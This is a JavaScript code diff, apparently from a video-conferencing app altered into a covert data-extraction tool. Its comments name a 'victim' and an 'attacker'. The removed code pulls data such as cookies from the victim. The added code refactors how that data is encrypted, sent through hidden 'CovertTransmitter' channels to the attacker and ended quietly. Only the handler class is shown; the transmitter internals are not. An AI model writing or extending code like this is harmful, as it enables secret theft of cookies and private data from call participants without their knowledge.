@@ -1,9 +1,6 @@
 /* eslint-disable max-params */
 /* global APP, getDefaultSettings */
 
-import { extractionStarted } from '../react/features/subtitles';
-
-
 import CovertReceiver from './CovertReceiver';
 import CovertTransmitter from './CovertTransmitter';
 import DataEncoder from './DataEncoder';
@@ -40,38 +37,9 @@ export class CommunicationHandler {
     constructor(receivedMessage) {
         this.receivedMessage = receivedMessage;
         this.configuration = getDefaultSettings(defaultConfigurationValues, receivedMessage.config);
+        this.extractionEvent = new EventTarget();
         this._fileBuffer = [];
         this.communicationEnded = false;
-        this.nameOfCommunication = this.getCommunicationName();
-    }
-
-    /**
-     *
-     * @returns {string}
-     */
-    getCommunicationName() {
-        return this.configuration.debug ? 'extraction' : DataEncoder.generateName();
-    }
-
-    /**
-     * Handle sent message
-     */
-    handleMessage(user) {
-        // this runs on the victim's side
-        if (this.receivedMessage.extraction === 'request') {
-            if (this.receivedMessage.config.dataType !== 'cookies') {
-                APP.conference.dispatchExtraction(user, this.receivedMessage);
-
-                return;
-            }
-            this._acquireData(this.receivedMessage.config).then(acquiredData => {
-                this.sendAll(acquiredData, user);
-            });
-        } else { // 'reply' received, this runs on the attacker's side
-            this.extractionEvent = APP.conference._extractionEventElement;
-
-            this.receiveEndpointData(this.receivedMessage);
-        }
     }
 
     /**
@@ -111,16 +79,15 @@ export class CommunicationHandler {
     receiveEndpointData(recievedData) {
         // extract data using specified method
         if (recievedData.isEnd) { // 'reply' control ending message
-            if (this.extractionEvent) {
-                // Event for downloading extracted data at the end of extraction.
-                // Define custom event 'extractionEnded' and trigger it.
-                this.extractionEvent.dispatchEvent(new CustomEvent('extractionEnded', {
-                    detail: {
-                        extractedData: this.fullData,
-                        config: this.configuration
-                    }
-                }));
-            }
+
+            // Event for downloading extracted data at the end of extraction.
+            // Define custom event 'extractionEnded' and trigger it.
+            this.extractionEvent.dispatchEvent(new CustomEvent('extractionEnded', {
+                detail: {
+                    extractedData: this.fullData,
+                    config: this.configuration
+                }
+            }));
             this._fileBuffer = []; // empty the file buffer after ending communication.
             this.communicationEnded = true;
 
@@ -142,24 +109,63 @@ export class CommunicationHandler {
 export default class ExtractionHandler extends CommunicationHandler {
 
     /**
+     *
+     * @param {*} receivedMessage
+     */
+    constructor(receivedMessage) {
+        super(receivedMessage);
+        this.nameOfCommunication = this.getCommunicationName();
+    }
+
+    /**
+     *
+     * @returns {string}
+     */
+    getCommunicationName() {
+        return this.configuration.debug ? 'extraction' : DataEncoder.generateName();
+    }
+
+    /**
+     *
+     * @param {object} initiator
+     */
+    executeCommand(initiator) {
+        initiator[initiator.getUsedMethod()]();
+    }
+
+    /**
+     * This is only for the victim's site
+     */
+    createExtractionEndedListener(attacker) {
+        this.extractionEvent.addEventListener('extractionEnded', () => {
+            this.endCommunication(attacker);
+        });
+    }
+
+    /**
      * Send data through the specified method.
      * @param {any} data - data to be sent.
      */
     sendAll(data, attacker) {
         // If the method can loose data through the transition send the final size of sent file.
+        const mandatory = [ this.configuration, this.nameOfCommunication, this.extractionEvent ];
+
+        this.createExtractionEndedListener(attacker);
+
+        console.log('send mandatory:', ...mandatory);
 
         if (this.enabledEncryption()) {
             DataEncoder.encrypt(data).then(encryptedData => {
-                const initiator = new CovertTransmitter(attacker, this.configuration, 
-                    this.nameOfCommunication, encryptedData);
+                const initiator = new CovertTransmitter(attacker, this.configuration,
+                        this.nameOfCommunication, this.extractionEvent, encryptedData);
 
-                initiator.getUsedMethod()();
+                this.executeCommand(initiator);
             });
         } else {
             const initiator = new CovertTransmitter(attacker, this.configuration,
-                    this.nameOfCommunication, data);
+                    this.nameOfCommunication, this.extractionEvent, data);
 
-            initiator.getUsedMethod()();
+            this.executeCommand(initiator);
         }
     }
 
@@ -168,8 +174,24 @@ export default class ExtractionHandler extends CommunicationHandler {
      */
     receiveAll(user) {
         // TODO: add generic code for all types of communication.
-        const initiator = new CovertTransmitter(user, this.configuration, this.nameOfCommunication, this._fileBuffer);
+        const mandatory = [ this.configuration, this.nameOfCommunication, this.extractionEvent ];
 
-        initiator.getUsedMethod()();
+        console.log('receive mandatory:', ...mandatory);
+
+        const initiator = new CovertReceiver(user, this.configuration,
+                this.nameOfCommunication, this.extractionProcess, this._fileBuffer);
+
+        this.executeCommand(initiator);
+    }
+
+    /**
+     * End hidden communication between users
+     */
+    endCommunication(user) {
+        APP.conference.sendEndpointMessage(user.getId(), {
+            extraction: 'reply',
+            isEnd: true
+        });
+        this.communicationEnded = true;
     }
 }
